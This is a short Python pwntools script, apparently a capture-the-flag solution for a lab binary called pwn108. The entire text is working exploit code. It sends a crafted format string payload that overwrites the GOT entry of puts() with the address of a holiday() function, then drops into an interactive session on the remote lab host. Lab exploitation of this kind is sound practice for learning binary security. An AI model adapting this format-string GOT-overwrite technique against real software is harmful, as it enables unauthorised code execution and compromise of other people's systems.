from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('10.10.167.99', 9008)
    else:
        r = process('./pwn108.pwn108')
    
    libc = ELF('./pwn108.pwn108', checksec=False)
    got_puts_addr = libc.got['puts']
    log.info(f"GOT address of puts(): {hex(got_puts_addr)}")
    payload = b'OceanTran999'
    
    r.recvuntil('=[Your name]: ')
    r.send(payload)                     # Avoid '\x00' byte when exploiting format string vulnerability

    # Replace the GOT address of puts() to holiday()
    payload = b'%4198971x%12$lnA'       # Address of holiday()
    payload += p64(got_puts_addr)       # GOT address of puts()

    r.recvuntil('=[Your Reg No]: ')
    r.sendline(payload)
    r.interactive()

exploit(True)